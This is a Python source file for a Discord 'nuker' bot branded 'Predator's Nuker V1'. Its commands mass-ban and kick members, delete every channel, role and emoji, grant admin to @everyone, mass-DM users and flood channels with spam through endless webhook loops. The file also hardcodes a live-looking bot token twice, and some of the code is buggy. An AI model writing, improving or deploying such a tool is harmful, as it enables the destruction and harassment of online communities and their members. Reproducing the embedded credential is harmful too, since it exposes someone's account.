import discord
from discord.ext import commands
import os
import random 
from discord import Permissions




client = commands.Bot(command_prefix="!", intents = discord.Intents.all())



token =("MTAxMDk4NTg5NjgwNTQxMjk4NA.G6WHlM.R1JoW1bwFcu3_UbTRP8H03uCm_na-Fhqpxk5Gc") #input your bot token here


CHANNEL_NAMES = ['Nuked By Predator']
MESSAGE_CONTENTS = ["@everyone Nuked By Predator https://media.discordapp.net/attachments/1001412049148051466/1001412244720074793/InShot_20220709_0720414970.mp4 https://discord.gg/nZa9kNJsjV"]
WEBHOOK_NAMES = ['Nuked By Predator']

client.remove_command('help')

                                         







@client.command("ban")
async def ban(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
         if member.id != 695070568826929214:
          for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} Was Banned")
            except:
                pass


@client.command()
async def dm(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
    except:
      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")



@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone has admin") 
                  except:
                      print("Failed to give everyone admin")



@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "dyno.gg | ?help"))
print('''Nuker is Ready!
 ___            _      _           
| _ \_ _ ___ __| |__ _| |_ ___ _ _ 
|  _/ '_/ -_) _` / _` |  _/ _ \ '_|
|_| |_| \___\__,_\__,_|\__\___/_|''')

@client.command(pass_context=True)
async def name(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@client.command()
async def roles(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"Nuked By Predator")
      print("Created Roles")
    except:
        print("Failed To Create Role")


  
@client.command("nuke")
async def nuke(ctx, amount=50):
  await ctx.guild.edit(name="Nuked By Predator")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(channel.name + " Has been nuked")
    except:
        pass
        print ("error")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
      print(f"[{i}] channels made")
    except:
      print("error making channels")
  for role in ctx.guild.roles:
    try:
      await role.delet()
      print(f"{role.name} deleted")

    except:
      print(f"{role.name} not deleted")
  await asyncio.sleep(2)
  for i in range(100):  
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(MESSAGE_CONTENTS)
        )
          print(f"{channel.name} spammed")
        except:
          print(f"{channel.name} not spammed")
    for member in ctx.guild.members:
      if member.id != 320408390587121664:  
        try:
          await member.ban(reason="Nuked By Predator")
          print(f"{member.name} banned from {ctx.guild.name}")
        except:
          print(f"{member.name} not banned from {ctx.guild.name}")

        
@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(MESSAGE_CONTENTS))
    await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))



@client.command("kick")
async def kick(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="Nuked By Predator")
      print(member.name + "Has Been Kicked")
    except:
      print(member.name + "Has Not Been Kicked")

@client.command(aliases=["h", "Help"])
async def help(ctx, category=None):
    if category is None:
        embed = discord.Embed(color=0x000001)
        embed.set_thumbnail(url="")
        embed.add_field(name="**__Predator's Nuker V1 Server Nuker HELP MENU__**",
                        value=f"**• My Prefix is `!` | Total Commands - ``9``**",
                        inline=False)
        embed.add_field(
            name="__COMMANDS__",
            value=
            f"**\n!nuke - Nukes The Whole Server\n!ban - Bans All The Members In The Server\n!kick - Kicks All The Members in The Server\n!roles - Start Spamming Role In Server\n!emojidel - Deletes All Emojis Of The Server\n!dm - Mass DM Everyone in the Server\n!𝗇𝖺𝗆𝖾 - C𝗁𝖺𝗇𝗀𝖾𝗌 Guild Name\n!𝖺𝖽𝗆𝗂𝗇 - Set's Admin Perms To Everyone Role\n!prune - Prune Members in The Server For inactivity of 1 day\n\n`Made By Predator`**",
            inline=True)
        embed.set_image(url="")
        await ctx.reply(embed=embed)

@client.command()
async def prune(ctx):
  await ctx.reply(" Initiating a prune request.")
  await ctx.guild.prune_members(days=1, roles=ctx.guild.roles)
  await ctx.reply("Successfully Pruned Members With 1 Day Of Inactivity")
  
client.run("MTAxMDk4NTg5NjgwNTQxMjk4NA.G6WHlM.R1JoW1bwFcu3_UbTRP8H03uCm_na-Fhqpxk5Gc")